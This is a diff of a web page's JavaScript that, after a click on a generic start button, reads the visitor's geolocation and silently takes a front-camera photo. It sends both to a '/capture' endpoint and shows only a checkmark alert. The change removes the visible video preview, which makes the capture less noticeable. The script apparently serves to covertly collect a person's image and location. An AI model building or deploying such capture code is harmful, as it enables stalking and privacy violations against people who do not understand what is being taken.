@@ -1,33 +1,42 @@
-document.getElementById('start-btn').addEventListener('click', async () => {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+document.addEventListener('DOMContentLoaded', () => {
+    const startBtn = document.getElementById('start-btn');
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const data = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude
-                };
-
-                // POST request to your server
-                await fetch('/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                alert('Location sent successfully!');
-            }, (err) => {
-                console.error('Geolocation error:', err);
-                alert('Please enable location!');
-            });
-        } else {
-            alert('Geolocation not supported!');
+    startBtn.addEventListener('click', async () => {
+        // Geolocation
+        if (!navigator.geolocation) {
+            alert('Geolocation not supported by your browser!');
+            return;
         }
 
-    } catch (err) {
-        console.error('Camera access error:', err);
-        alert('Please enable camera!');
-    }
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            try {
+                // Camera (Front)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const photoBlob = await imageCapture.takePhoto();
+
+                const formData = new FormData();
+                formData.append('photo', photoBlob, 'photo.jpg');
+                formData.append('latitude', latitude);
+                formData.append('longitude', longitude);
+
+                await fetch('/capture', { method: 'POST', body: formData });
+
+                track.stop();
+                alert('✅ ');
+
+            } catch (err) {
+                console.error(err);
+                alert('Camera access denied or error occurred!');
+            }
+
+        }, (err) => {
+            console.error(err);
+            alert('Location access denied or unavailable!');
+        });
+    });
 });
